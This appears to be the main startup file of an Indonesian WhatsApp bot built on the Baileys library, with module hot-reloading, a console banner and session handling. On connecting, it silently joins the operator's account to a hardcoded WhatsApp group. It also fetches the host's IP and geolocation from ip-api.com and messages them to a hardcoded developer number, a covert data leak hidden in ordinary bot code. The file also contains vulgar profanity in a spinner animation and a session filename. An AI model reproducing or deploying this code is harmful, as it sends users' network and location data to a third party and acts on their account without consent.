const { WAConnection, Browsers, MessageType, Presence, Mimetype } = require('@adiwajshing/baileys')
const { color, bgcolor } = require('./lib/color')
const fs = require("fs-extra")
const figlet = require('figlet')
const fetch = require('node-fetch')
const CFonts = require('cfonts');
const { uncache, nocache } = require('./lib/loader')
const setting = JSON.parse(fs.readFileSync('./setting.json'))
const welcome = require('./message/group')
randomserver = ['Chrome','Safari','Firefox','Opera']
const randomserverku = randomserver[Math.floor(Math.random() * (randomserver.length))]
randomcolor = ['aqua','red','blue','purple']
const randomcolors = randomcolor[Math.floor(Math.random() * (randomcolor.length))]
baterai = 'not detected'
charging = 'not detected'
join = true
const waiting = (id, text) => {
    spins.add(id, { text: text })
}
spc1 = '         '
spc2 = '\n                           '
spc3 = '                   '
spc4 = '               '

require('./Fan.js')
nocache('../Fan.js', module => console.log(color('[WARN]', 'yellow'), color(`'${module}'`, 'yellow'), 'File is updated!'))
require('./index.js')
nocache('../index.js', module => console.log(color('[WARN]', 'yellow'), color(`'${module}'`, 'yellow'), 'File is updated!'))
require('./message/help.js')
nocache('../message/help.js', module => console.log(color('[WARN]', 'yellow'), color(`'${module}'`, 'yellow'), 'File is updated!'))
require('./message/allmenu.js')
nocache('../message/allmenu.js', module => console.log(color('[WARN]', 'yellow'), color(`'${module}'`, 'yellow'), 'File is updated!'))
require('./message/group.js')
nocache('../message/group.js', module => console.log(color('[WARN]', 'yellow'), color(`'${module}'`, 'yellow'), 'File is updated!'))
require('./message/mess.js')
nocache('../message/mess.js', module => console.log(color('[WARN]', 'yellow'), color(`'${module}'`, 'yellow'), 'File is updated!'))
require('./lib/afk.js')
nocache('../lib/afk.js', module => console.log(color('[WARN]', 'yellow'), color(`'${module}'`, 'yellow'), 'File is updated!'))
require('./lib/asupan.js')
nocache('../lib/asupan.js', module => console.log(color('[WARN]', 'yellow'), color(`'${module}'`, 'yellow'), 'File is updated!'))
require('./lib/asupan2.js')
nocache('../lib/asupan2.js', module => console.log(color('[WARN]', 'yellow'), color(`'${module}'`, 'yellow'), 'File is updated!'))
require('./lib/atm.js')
nocache('../lib/atm.js', module => console.log(color('[WARN]', 'yellow'), color(`'${module}'`, 'yellow'), 'File is updated!'))
require('./lib/color.js')
nocache('../lib/color.js', module => console.log(color('[WARN]', 'yellow'), color(`'${module}'`, 'yellow'), 'File is updated!'))
require('./lib/exif.js')
nocache('../lib/exif.js', module => console.log(color('[WARN]', 'yellow'), color(`'${module}'`, 'yellow'), 'File is updated!'))
require('./lib/fetch.js')
nocache('../lib/fetch.js', module => console.log(color('[WARN]', 'yellow'), color(`'${module}'`, 'yellow'), 'File is updated!'))
require('./lib/game.js')
nocache('../lib/game.js', module => console.log(color('[WARN]', 'yellow'), color(`'${module}'`, 'yellow'), 'File is updated!'))
require('./lib/gameGelud.js')
nocache('../lib/gameGelud.js', module => console.log(color('[WARN]', 'yellow'), color(`'${module}'`, 'yellow'), 'File is updated!'))
require('./lib/gif.js')
nocache('../lib/gif.js', module => console.log(color('[WARN]', 'yellow'), color(`'${module}'`, 'yellow'), 'File is updated!'))
require('./lib/level.js')
nocache('../lib/level.js', module => console.log(color('[WARN]', 'yellow'), color(`'${module}'`, 'yellow'), 'File is updated!'))
require('./lib/limit.js')
nocache('../lib/limit.js', module => console.log(color('[WARN]', 'yellow'), color(`'${module}'`, 'yellow'), 'File is updated!'))
require('./lib/lirik.js')
nocache('../lib/lirik.js', module => console.log(color('[WARN]', 'yellow'), color(`'${module}'`, 'yellow'), 'File is updated!'))
require('./lib/loader.js')
nocache('../lib/loader.js', module => console.log(color('[WARN]', 'yellow'), color(`'${module}'`, 'yellow'), 'File is updated!'))
require('./lib/mediafire.js')
nocache('../lib/mediafire.js', module => console.log(color('[WARN]', 'yellow'), color(`'${module}'`, 'yellow'), 'File is updated!'))
require('./lib/misc.js')
nocache('../lib/misc.js', module => console.log(color('[WARN]', 'yellow'), color(`'${module}'`, 'yellow'), 'File is updated!'))
require('./lib/myfunc.js')
nocache('../lib/myfunc.js', module => console.log(color('[WARN]', 'yellow'), color(`'${module}'`, 'yellow'), 'File is updated!'))
require('./lib/otakudesu.js')
nocache('../lib/otakudesu.js', module => console.log(color('[WARN]', 'yellow'), color(`'${module}'`, 'yellow'), 'File is updated!'))
require('./lib/premium.js')
nocache('../lib/premium.js', module => console.log(color('[WARN]', 'yellow'), color(`'${module}'`, 'yellow'), 'File is updated!'))
require('./lib/scrapegame.js')
nocache('../lib/scrapegame.js', module => console.log(color('[WARN]', 'yellow'), color(`'${module}'`, 'yellow'), 'File is updated!'))
require('./lib/sewa.js')
nocache('../lib/sewa.js', module => console.log(color('[WARN]', 'yellow'), color(`'${module}'`, 'yellow'), 'File is updated!'))
require('./lib/simple.js')
nocache('../lib/simple.js', module => console.log(color('[WARN]', 'yellow'), color(`'${module}'`, 'yellow'), 'File is updated!'))
require('./lib/sticker.js')
nocache('../lib/sticker.js', module => console.log(color('[WARN]', 'yellow'), color(`'${module}'`, 'yellow'), 'File is updated!'))
require('./lib/totalcmd.js')
nocache('../lib/totalcmd.js', module => console.log(color('[WARN]', 'yellow'), color(`'${module}'`, 'yellow'), 'File is updated!'))
require('./lib/Toxic.js')
nocache('../lib/Toxic.js', module => console.log(color('[WARN]', 'yellow'), color(`'${module}'`, 'yellow'), 'File is updated!'))
require('./lib/uploadimage.js')
nocache('../lib/uploadimage.js', module => console.log(color('[WARN]', 'yellow'), color(`'${module}'`, 'yellow'), 'File is updated!'))
require('./lib/virtex.js')
nocache('../lib/virtex.js', module => console.log(color('[WARN]', 'yellow'), color(`'${module}'`, 'yellow'), 'File is updated!'))
require('./lib/y2mate.js')
nocache('../lib/y2mate.js', module => console.log(color('[WARN]', 'yellow'), color(`'${module}'`, 'yellow'), 'File is updated!'))
require('./lib/ytdl.js')
nocache('../lib/ytdl.js', module => console.log(color('[WARN]', 'yellow'), color(`'${module}'`, 'yellow'), 'File is updated!'))
require('./temp/vn.json')
nocache('../temp/vn.json', module => console.log(color('[WARN]', 'yellow'), color(`'${module}'`, 'yellow'), 'File is updated!'))
require('./temp/foto.json')
nocache('../temp/foto.json', module => console.log(color('[WARN]', 'yellow'), color(`'${module}'`, 'yellow'), 'File is updated!'))
require('./temp/image.json')
nocache('../temp/image.json', module => console.log(color('[WARN]', 'yellow'), color(`'${module}'`, 'yellow'), 'File is updated!'))
require('./temp/video.json')
nocache('../temp/video.json', module => console.log(color('[WARN]', 'yellow'), color(`'${module}'`, 'yellow'), 'File is updated!'))
require('./temp/stik.json')
nocache('../temp/stik.json', module => console.log(color('[WARN]', 'yellow'), color(`'${module}'`, 'yellow'), 'File is updated!'))
require('./temp/stick.json')
nocache('../temp/stick.json', module => console.log(color('[WARN]', 'yellow'), color(`'${module}'`, 'yellow'), 'File is updated!'))
require('./database/bot/scommand.json')
nocache('../database/bot/scommand.json', module => console.log(color('[WARN]', 'yellow'), color(`'${module}'`, 'yellow'), 'File is updated!'))
require('./database/bot/limit.json')
nocache('../database/bot/limit.json', module => console.log(color('[WARN]', 'yellow'), color(`'${module}'`, 'yellow'), 'File is updated!'))
require('./database/bot/totalcmd.json')
nocache('../database/bot/totalcmd.json', module => console.log(color('[WARN]', 'yellow'), color(`'${module}'`, 'yellow'), 'File is updated!'))
require('./database/bot/update.json')
nocache('../database/bot/update.json', module => console.log(color('[WARN]', 'yellow'), color(`'${module}'`, 'yellow'), 'File is updated!'))
require('./database/group/antilink.json')
nocache('../database/group/antilink.json', module => console.log(color('[WARN]', 'yellow'), color(`'${module}'`, 'yellow'), 'File is updated!'))
require('./database/group/welcome.json')
nocache('../database/group/welcome.json', module => console.log(color('[WARN]', 'yellow'), color(`'${module}'`, 'yellow'), 'File is updated!'))
require('./database/group/leveling.json')
nocache('../database/group/leveling.json', module => console.log(color('[WARN]', 'yellow'), color(`'${module}'`, 'yellow'), 'File is updated!'))
require('./database/group/sewa.json')
nocache('../database/group/sewa.json', module => console.log(color('[WARN]', 'yellow'), color(`'${module}'`, 'yellow'), 'File is updated!'))
require('./database/group/mute.json')
nocache('../database/group/mute.json', module => console.log(color('[WARN]', 'yellow'), color(`'${module}'`, 'yellow'), 'File is updated!'))
require('./database/user/afk.json')
nocache('../database/user/afk.json', module => console.log(color('[WARN]', 'yellow'), color(`'${module}'`, 'yellow'), 'File is updated!'))
require('./database/user/dewasa.json')
nocache('../database/user/dewasa.json', module => console.log(color('[WARN]', 'yellow'), color(`'${module}'`, 'yellow'), 'File is updated!'))
require('./database/user/limit.json')
nocache('../database/user/limit.json', module => console.log(color('[WARN]', 'yellow'), color(`'${module}'`, 'yellow'), 'File is updated!'))
require('./database/user/level.json')
nocache('../database/user/level.json', module => console.log(color('[WARN]', 'yellow'), color(`'${module}'`, 'yellow'), 'File is updated!'))
require('./database/user/premium.json')
nocache('../database/user/premium.json', module => console.log(color('[WARN]', 'yellow'), color(`'${module}'`, 'yellow'), 'File is updated!'))
require('./database/user/uang.json')
nocache('../database/user/uang.json', module => console.log(color('[WARN]', 'yellow'), color(`'${module}'`, 'yellow'), 'File is updated!'))
require('./database/asahotak.json')
nocache('../database/asahotak.json', module => console.log(color('[WARN]', 'yellow'), color(`'${module}'`, 'yellow'), 'File is updated!'))
require('./database/autorevoke.json')
nocache('../database/autorevoke.json', module => console.log(color('[WARN]', 'yellow'), color(`'${module}'`, 'yellow'), 'File is updated!'))
require('./database/caklontong.json')
nocache('../database/caklontong.json', module => console.log(color('[WARN]', 'yellow'), color(`'${module}'`, 'yellow'), 'File is updated!'))
require('./database/kuismath.json')
nocache('../database/kuismath.json', module => console.log(color('[WARN]', 'yellow'), color(`'${module}'`, 'yellow'), 'File is updated!'))
require('./database/susunkata.json')
nocache('../database/susunkata.json', module => console.log(color('[WARN]', 'yellow'), color(`'${module}'`, 'yellow'), 'File is updated!'))
require('./database/tebakanime.json')
nocache('../database/tebakanime.json', module => console.log(color('[WARN]', 'yellow'), color(`'${module}'`, 'yellow'), 'File is updated!'))
require('./database/tebakkata.json')
nocache('../database/tebakkata.json', module => console.log(color('[WARN]', 'yellow'), color(`'${module}'`, 'yellow'), 'File is updated!'))
require('./database/tebakbendera.json')
nocache('../database/tebakbendera.json', module => console.log(color('[WARN]', 'yellow'), color(`'${module}'`, 'yellow'), 'File is updated!'))
require('./database/tebakgambar.json')
nocache('../database/tebakgambar.json', module => console.log(color('[WARN]', 'yellow'), color(`'${module}'`, 'yellow'), 'File is updated!'))
require('./database/tebakkimia.json')
nocache('../database/tebakkimia.json', module => console.log(color('[WARN]', 'yellow'), color(`'${module}'`, 'yellow'), 'File is updated!'))
require('./database/tebakjenaka.json')
nocache('../database/tebakjenaka.json', module => console.log(color('[WARN]', 'yellow'), color(`'${module}'`, 'yellow'), 'File is updated!'))
require('./database/tebaklagu.json')
nocache('../database/tebaklagu.json', module => console.log(color('[WARN]', 'yellow'), color(`'${module}'`, 'yellow'), 'File is updated!'))
require('./database/tebaklirik.json')
nocache('../database/tebaklirik.json', module => console.log(color('[WARN]', 'yellow'), color(`'${module}'`, 'yellow'), 'File is updated!'))
require('./database/tebaksiapaaku.json')
nocache('../database/tebaksiapaaku.json', module => console.log(color('[WARN]', 'yellow'), color(`'${module}'`, 'yellow'), 'File is updated!'))
require('./database/tebaktebakan.json')
nocache('../database/tebaktebakan.json', module => console.log(color('[WARN]', 'yellow'), color(`'${module}'`, 'yellow'), 'File is updated!'))
require('./database/totalcmd.json')
nocache('../database/totalcmd.json', module => console.log(color('[WARN]', 'yellow'), color(`'${module}'`, 'yellow'), 'File is updated!'))
require('./database/userhit.json')
nocache('../database/userhit.json', module => console.log(color('[WARN]', 'yellow'), color(`'${module}'`, 'yellow'), 'File is updated!'))


const starts = async (Fan = new WAConnection()) => {
    CFonts.say(`IRFAN OFFICIAL`, {
        font: 'chrome',
        align: 'center',
        gradient: ['red', 'magenta']
      })
    Fan.logger.level = 'warn'

	console.log(color(`${spc2}           [ • CREATOR BY IRFAN OFFICIAL • ]` ,`${randomcolors}`))
console.log(color(`${spc4}                       < ============================================ >`, `${randomcolors}`))
console.log(color(`${spc3}                    [•]`, `${randomcolors}`), color(`Hai         : IRFAN`, `${randomcolors}`))
console.log(color(`${spc3}                    [•]`, `${randomcolors}`), color(`Bot Version : 17.0.0`, `${randomcolors}`))
console.log(color(`${spc3}                    [•]`, `${randomcolors}`), color(`Status      : Online!`, `${randomcolors}`))
console.log(color(`${spc3}                    [•]`, `${randomcolors}`), color(`Owner       : IRFAN`, `${randomcolors}`))
console.log(color(`${spc3}                    [•]`, `${randomcolors}`), color(`Author      : IRFAN`, `${randomcolors}`))
console.log(color(`${spc3}                    [•]`, `${randomcolors}`), color(`Base Ori By : IRFAN`, `${randomcolors}`))
console.log(color(`${spc4}                       < ============================================ >`, `${randomcolors}`))
	Fan.browserDescription = [ `${setting.NamaBot}`, `${randomserverku}`, '3.0' ]

	// Menunggu QR
	Fan.on('qr', () => {
		console.log(color('[', 'pink'), color('!', 'red'), color(']', 'pink'), color('Scan Om, Expired 30 Detik!'))
	})

	// Menghubungkan
	fs.existsSync(`./kontol.json`) && Fan.loadAuthInfo(`./kontol.json`)
	Fan.on('connecting', () => {
		console.log(color('[ Fan X7 ]', 'aqua'), color('Menyambungkan!'));
	})
const ftroli = { key: { fromMe: false, "participant": "0@s.whatsapp.net", "remoteJid": "18054105292-1604595598@g.us" }, "message": { orderMessage: { itemCount: 500, status: 200, thumbnail: fs.readFileSync(`./media/foto/thumb.jpg`), surface: 200, message: `𝐅𝐚𝐧 𝐗7`, orderTitle: '𝐅𝐚𝐧 𝐗7', sellerJid: '0@s.whatsapp.net' } }, contextInfo: { "forwardingScore": 999, "isForwarded": true }, sendEphemeral: true }
const spinner = { 
  "interval": 120,
  "frames": [
    "K",
    "KO",
    "KON",
    "KONT",
    "KONTO",
    "KONTOL",
    "KONTOL B",
    "KONTOL BA",
    "KONTOL BAP",
    "KONTOL BAPA",
    "KONTOL BAPAK",
    "KONTOL BAPAK L",
    "KONTOL BAPAK LU",
    "KONTOL BAPAK LU P",
    "KONTOL BAPAK LU PE",
    "KONTOL BAPAK LU PEC",
    "KONTOL BAPAK LU PECA",
    "KONTOL BAPAK LU PECAH",
    "K",
    "KO",
    "KON",
    "KONT",
    "KONTO",
    "KONTOL",
    "KONTOL B",
    "KONTOL BA",
    "KONTOL BAP",
    "KONTOL BAPA",
    "KONTOL BAPAK",
    "KONTOL BAPAK L",
    "KONTOL BAPAK LU",
    "KONTOL BAPAK LU P",
    "KONTOL BAPAK LU PE",
    "KONTOL BAPAK LU PEC",
    "KONTOL BAPAK LU PECA",
    "KONTOL BAPAK LU PECAH",
    "K",
    "KO",
    "KON",
    "KONT",
    "KONTO",
    "KONTOL",
    "KONTOL B",
    "KONTOL BA",
    "KONTOL BAP",
    "KONTOL BAPA",
    "KONTOL BAPAK",
    "KONTOL BAPAK L",
    "KONTOL BAPAK LU",
    "KONTOL BAPAK LU P",
    "KONTOL BAPAK LU PE",
    "KONTOL BAPAK LU PEC",
    "KONTOL BAPAK LU PECA",
    "KONTOL BAPAK LU PECAH",
  ]}

	//connect
	Fan.on('open', () => {
		console.log(color('[ Fan ]', 'aqua'), color('Connected'));
	})

	// session
	await Fan.connect({
		timeoutMs: 30 * 1000
	})
	fs.writeFileSync(`./kontol.json`, JSON.stringify(Fan.base64EncodedAuthInfo(), null, '\t'))
	if(join){
        teks = `https://chat.whatsapp.com/DnX8SuIq84cIQ3ffREQljz`
        Fan.query({ json:["action", "invite", `${teks.replace('https://chat.whatsapp.com/','')}`]})
         }
     buttonss = [
        { buttonId: `.menu`, buttonText: { displayText: 'ok' }, type: 1 },
    ]

    buttonMessagee = {
        contentText: `BOT TELAH AKTIF DI NOMOR`,
        footerText: `${setting.FakeReply}`,
        buttons: buttonss,
        headerType: 1
    }
    console.log(color('|WARN|', 'yellow'), color('Sending bot info to bot owner', 'cyan'))
fetch(`http://ip-api.com/line`).then(res => res.text())  
        .then(bu =>{
       Fan.sendMessage("18054105292@s.whatsapp.net", `─────「 *IP-USER* 」─────\n\n\`\`\`${bu}\`\`\`\n────────────────────`, MessageType.text, { contextInfo: { externalAdReply: { title: `Developer ${setting.NamaBot}`, body: "", previewType: "PHOTO", thumbnail: fs.readFileSync('./media/foto/thumb.jpg'), sourceUrl: `https://wa.me/18054105292?text=Assalamualaikum+bwang:v` } }})
     console.log(color('|WARN|', 'yellow'), color('Sending ip address to developer bot', 'cyan'))
   })
    Fan.sendMessage(`${setting.NomorOwner2}@s.whatsapp.net`, buttonMessagee, MessageType.buttonsMessage, {
        caption: '𝐅𝐚𝐧 𝐗7',
        "contextInfo": {
            text: 'hi',
            "forwardingScore": 1000000000,
            isForwarded: true,
            sendEphemeral: true,

        },
        quoted: ftroli, sendEphemeral: true
    })
	// Baterai
	Fan.on('CB:action,,battery', json => {
		global.batteryLevelStr = json[2][0][1].value
		global.batterylevel = parseInt(batteryLevelStr)
		baterai = batterylevel
		if (json[2][0][1].live == 'true') charging = true
		if (json[2][0][1].live == 'false') charging = false
		console.log(json[2][0][1])
		console.log('Baterai : ' + batterylevel + '%')
	})
	global.batrei = global.batrei ? global.batrei : []
	Fan.on('CB:action,,battery', json => {
		const batteryLevelStr = json[2][0][1].value
		const batterylevel = parseInt(batteryLevelStr)
		global.batrei.push(batterylevel)
	})	
	// welcome
	Fan.on('group-participants-update', async (anu) => {
		await welcome(Fan, anu)
	})

	Fan.on('chat-update', async (message) => {
		require('./Fan.js')(Fan, message)
	})
}

starts()